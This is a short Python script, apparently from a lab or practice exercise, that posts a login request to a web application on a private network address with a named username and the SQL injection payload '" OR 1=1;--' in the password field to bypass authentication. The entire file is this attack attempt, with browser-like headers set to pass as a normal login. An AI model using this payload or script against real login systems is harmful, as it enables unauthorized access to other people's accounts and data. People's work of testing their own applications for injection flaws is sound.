def try1():
	import requests
	url = 'http://192.168.0.100/Login'
	cookies = {
		"fsr.s": "{\"v\":1}",
		"fsr.a": "1553322785320",
		'JSESSIONID': '4023F620CF10AAC6B3FA4905BD05FAAF',
	}
	cookies = {}
	data = {
		"username_field": "April.Rowland",
		"password_field": "\" OR 1=1;--",
	}
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0',
	    #'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.107',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Referer':'http://192.168.0.100/Accounts/New',
	    'Host':'192.168.0.100',
	    'Accept-Encoding': 'gzip, deflate',
	    #m'  # This is another valid field
	}

	res = requests.post(url, headers=headers, cookies=cookies, data=data)
	return res.text

print(try1())